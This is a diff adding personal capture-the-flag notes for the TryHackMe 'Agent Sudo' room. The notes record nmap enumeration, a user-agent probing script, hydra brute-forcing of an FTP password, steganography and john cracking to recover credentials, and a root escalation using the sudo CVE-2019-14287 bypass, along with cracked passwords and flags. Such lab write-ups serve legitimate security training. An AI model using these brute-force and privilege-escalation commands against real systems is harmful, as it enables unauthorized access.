@@ -1,0 +1,136 @@
+Agent Sudo (https://tryhackme.com/room/agentsudoctf)
+IP: 10.10.16.135
+http://10.10.16.135
+
+- ENUM
+- nmap
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
+|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
+|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Annoucement
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+- gobuster
+/index.php
+
+
+Website content:
+Dear agents,
+
+Use your own codename as user-agent to access the site.
+
+From,
+Agent R
+
+
+
+Website content with C letter as user-agent:
+Attention chris,
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
+
+From,
+Agent R
+
+
+exploit.py:
+import requests
+
+URL = "http://10.10.16.135/"
+
+alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+
+for i in range(len(alphabet)):
+    data = {
+        "Host": "10.10.16.135",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Upgrade-Insecure-Requests": "1",
+        "User-Agent": f"{alphabet[i]}",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Connection": "keep-alive"
+    }
+
+    request = requests.get(URL, headers=data)
+
+    if "Use your own" in request.text:
+        print(f"---{alphabet[i]}---> NONE")
+    else:
+        print(f"---{alphabet[i]}---")
+
+
+- USE HYDRA FOR CHRIS' FTP PASSWORD (hydra -l chris -t 30 -P /usr/share/wordlists/rockyou.txt ftp://10.10.16.135)
+password: crystal
+
+To_agentJ.txt:
+Dear agent J,
+
+All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
+
+From,
+Agent C
+
+
+- EXTRACT ZIP FROM IMAGE cutie.png (dd if=cutie.png of=hidden.zip bs=1 skip=$((0x8702)))
+
+- USE JOHN
+$ zip2john hidden.zip > hidden.hash
+$ john hidden.hash
+password: "alien"
+
+
+- To-agentR.txt
+Agent C,
+
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+By,
+Agent R
+
+
+"QXJlYTUx" > Base64 -> "Area51"
+
+
+$ steghide info cute-alien.jpg
+password: "Area51"
+-> \hidden: message.txt
+
+$ steghide extract -sf cute-alien.jpg
+ssh password: "hackerrules!"
+
+
+- message.txt:
+Hi james,
+
+Glad you find this message. Your login password is hackerrules!
+
+Don't ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+chris
+
+
+- LOG INTO JAMES' SSH
+$ cat user_flag.txt
+b03d975e8c92a7c04146cfa7a5a313c7
+
+$ sudo -l
+/bin/bash
+
+exploit (CVE-2019-14287):
+$ sudo -u#-1 /bin/bash
+# cat../../root/root.txt
+To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.
+
+Your flag is
+b53a02f55b57d4439e3341834d70c062
+
+By,
+DesKel a.k.a Agent R
